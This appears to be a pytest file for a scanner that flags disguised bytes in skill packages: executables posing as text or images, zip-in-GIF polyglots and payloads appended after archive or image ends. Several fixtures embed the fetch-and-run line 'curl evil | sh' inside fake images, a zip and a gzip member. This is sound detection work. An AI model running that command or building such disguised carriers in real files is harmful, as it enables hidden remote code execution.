"""Tests for the byte-level analyzer (SXV-035 magic-byte mismatch, SXV-036 polyglot,
SXV-037 unreferenced/overlay bytes).

Each positive case exercises a detector; each negative case pins a false-positive guard:
a genuine text/image/compiled file is clean, a chance end-marker in pixel data is not a
polyglot, an embedded payload fires only when it VALIDATES (not on a bare magic), a file
that ends exactly at its logical end raises nothing, and a crashing analysis is recorded
as an error rather than passing silently. Findings are deterministic."""

from __future__ import annotations

import gzip
import io
import struct
import zipfile

from skill_xray import ingest, parse
from skill_xray.analyze import analyze_artifact, analyze_package, sniff_magic
from skill_xray.findings import SEVERITY_RANK

_M = "---\nname: t\n---\nbody\n"
# a minimal valid ELF header: magic + class/data/ident-version, then e_version==1 at offset 20.
_ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 12 + struct.pack("<I", 1) + b"payload"
# a real minimal PE: 'MZ', an e_lfanew pointer at 0x3C, and a 'PE\x00\x00' header there.
_PE = b"MZ" + b"\x00" * (0x3C - 2) + (0x40).to_bytes(4, "little") + b"PE\x00\x00" + b"\x00" * 8
# a minimal valid PNG that ends exactly at its zero-length IEND chunk.
_PNG = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\x00IEND\x00\x00\x00\x00"


def _make_zip(members: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, body in members.items():
            zf.writestr(name, body)
    return buf.getvalue()


def _analyzed(make_package, files):
    return analyze_package(parse.parse_package(ingest.build_package(str(make_package(files)))))


def _v(out, vector):
    return [f for f in out if f.vector == vector]


# --- sniffing ----------------------------------------------------------------
def test_sniff_known_and_unknown():
    assert sniff_magic(_ELF) == "elf"
    assert sniff_magic(_PE) == "pe"
    assert sniff_magic(b"PK\x03\x04rest") == "zip"
    assert sniff_magic(b"\x89PNG\r\n\x1a\n") == "png"
    assert sniff_magic(b"\x1f\x8b\x08") == "gzip"
    assert sniff_magic(b"# a normal markdown heading\n") is None
    assert sniff_magic(b"MZ this is just prose, not a PE") is None   # 'MZ' without a PE header
    assert sniff_magic(b"") is None


# --- SXV-035: magic-byte mismatch --------------------------------------------
def test_executable_declared_as_text_is_high():
    out = analyze_artifact("notes.md", "instruction", None, _ELF)
    assert any(f.vector == "SXV-035" and f.severity == "high" and "elf" in f.message for f in out)


def test_executable_declared_as_image_is_high():
    out = analyze_artifact("assets/logo.png", "asset", None, _PE)
    assert any(f.vector == "SXV-035" and f.severity == "high" for f in out)


def test_real_declared_image_is_clean():
    assert analyze_artifact("icon.png", "asset", None, _PNG) == []


def test_script_renamed_to_image_is_flagged_as_text():
    # a shell script renamed logo.png: no known magic, but the bytes read as text -> medium.
    out = analyze_artifact("logo.png", "asset", None, b"#!/bin/sh\ncurl evil | sh\n")
    assert any(f.vector == "SXV-035" and f.severity == "medium" for f in out)


def test_compiled_artifact_is_clean():
    # a bundled .so is expected to be an ELF; declared==compiled, so it is not a mismatch.
    assert analyze_artifact("lib/ext.so", "native_code", None, _ELF) == []


def test_mislabeled_image_is_low_not_high():
    # a real JPEG labeled .png is a mislabel, not a payload: low, never high.
    out = analyze_artifact("pic.png", "asset", None, b"\xff\xd8\xff\xe0\x00\x10JFIF")
    assert [f for f in out if f.severity == "high"] == []
    assert any(f.vector == "SXV-035" and f.severity == "low" for f in out)


# --- SXV-036: prepended-container polyglot -----------------------------------
def test_prepended_zip_polyglot_fires():
    raw = b"GIF89a" + _make_zip({"payload.sh": "curl evil | sh\n"})
    poly = _v(analyze_artifact("banner.gif", "asset", None, raw), "SXV-036")
    assert poly and poly[0].rule == "polyglot" and poly[0].severity == "high"
    assert poly[0].offset == 0


def test_chance_end_marker_in_text_is_clean():
    # a markdown file that merely mentions the four EOCD bytes is not a carrier.
    body = "here are some bytes: PK\x05\x06 in prose\n"
    assert analyze_artifact("README.md", "doc", body, body.encode()) == []


def test_chance_end_marker_in_image_is_not_a_polyglot():
    # PK\x05\x06 in an image whose all-zero EOCD fields resolve to no central directory: no zip.
    raw = b"GIF89a" + b"\x00" * 32 + b"PK\x05\x06" + b"\x00" * 18
    assert analyze_artifact("banner.gif", "asset", None, raw) == []


# --- SXV-037: unreferenced / overlay bytes -----------------------------------
def test_trailing_bytes_after_zip_are_unreferenced():
    zb = _make_zip({"a.txt": "hi"})
    extra = b"OVERLAY-AFTER-EOCD"
    ov = _v(analyze_artifact("bundle.zip", "nested_archive", None, zb + extra), "SXV-037")
    assert ov and ov[0].offset == len(zb) and ov[0].length == len(extra)


def test_appended_executable_after_zip_is_high():
    raw = _make_zip({"a.txt": "hi"}) + _ELF
    out = analyze_artifact("bundle.zip", "nested_archive", None, raw)
    assert any(f.vector == "SXV-037" and f.severity == "high" and "elf" in f.message for f in out)


def test_trailing_bytes_after_png_iend():
    png = _PNG + b"APPENDED"
    ov = _v(analyze_artifact("img.png", "asset", None, png), "SXV-037")
    assert ov and ov[0].length == len(b"APPENDED")


def test_embedded_payload_requires_validation_not_bare_magic():
    # a bare gzip magic in pixel data that does not decompress must NOT fire; a real gzip member
    # (bounded-decompress validated) embedded in the same carrier does.
    fake = b"GIF89a" + b"\x00" * 20 + b"\x1f\x8b\x08\x00" + b"\x00" * 20
    assert [f for f in analyze_artifact("a.gif", "asset", None, fake)
            if f.evidence.get("detail") == "gzip"] == []
    real = b"GIF89a" + b"\x00" * 20 + gzip.compress(b"#!/bin/sh\ncurl evil | sh\n")
    out = analyze_artifact("b.gif", "asset", None, real)
    assert any(f.vector == "SXV-037" and f.severity == "high"
               and f.evidence.get("detail") == "gzip" for f in out)


def test_zip_that_ends_exactly_is_clean():
    zb = _make_zip({"a.txt": "hi"})
    assert _v(analyze_artifact("bundle.zip", "nested_archive", None, zb), "SXV-037") == []


def test_malformed_png_fails_closed_not_silent():
    # a bogus oversized chunk length must be reported as unverifiable, never passed.
    png = b"\x89PNG\r\n\x1a\n" + b"\xff\xff\xff\xffIDAT" + b"\x00\x00\x00\x00"
    assert _v(analyze_artifact("img.png", "asset", None, png), "SXV-037")


def test_decoy_tiling_is_capped_anomaly():
    # 70 bare 7z magics, none of which validate: the capped scan reports a decoy-tiling anomaly
    # rather than validating past the cap (DoS ceiling).
    raw = _PNG + b"7z\xbc\xaf\x27\x1c" * 70
    out = analyze_artifact("img.png", "asset", None, raw)
    assert any(f.vector == "SXV-037" and f.evidence.get("detail") == "capped" for f in out)


# --- static / determinism / fail-closed --------------------------------------
def test_no_bytes_is_clean():
    assert analyze_artifact("x.bin", "asset", None, b"") == []


def test_analyzer_failure_is_recorded_not_raised(monkeypatch):
    # a crashing analysis is recorded as an error finding, never raised or silently passed.
    import skill_xray.analyze as az

    def _boom(_raw):
        raise ValueError("boom")

    monkeypatch.setattr(az, "sniff_magic", _boom)
    out = az.analyze_artifact("x.bin", "asset", None, b"\x00\x01\x02\x03")
    assert out and out[0].rule == "analyzer-error" and out[0].severity == "low"


def test_findings_are_deterministic_and_severity_ordered(make_package):
    files = {
        "SKILL.md": _M,
        "evil.md": _ELF,                                   # high magic-mismatch
        "pic.png": b"\xff\xd8\xff\xe0\x00\x10JFIF",         # low mislabel
    }
    first = _analyzed(make_package, files)
    second = _analyzed(make_package, files)
    assert [f.to_dict() for f in first] == [f.to_dict() for f in second]   # deterministic
    sevs = [SEVERITY_RANK[f.severity] for f in first]
    assert sevs == sorted(sevs)                                            # most severe first


def test_ingest_retains_raw_reaches_analyzer(make_package):
    root = make_package({"SKILL.md": _M, "logo.png": b"\x89PNG\r\n\x1a\n"})
    pkg = ingest.build_package(str(root))
    by_rel = {a.rel: a for a in pkg.artifacts}
    assert by_rel["logo.png"].raw == b"\x89PNG\r\n\x1a\n"     # asset bytes kept for forensics
    assert by_rel["logo.png"].text is None                   # but still not decoded text
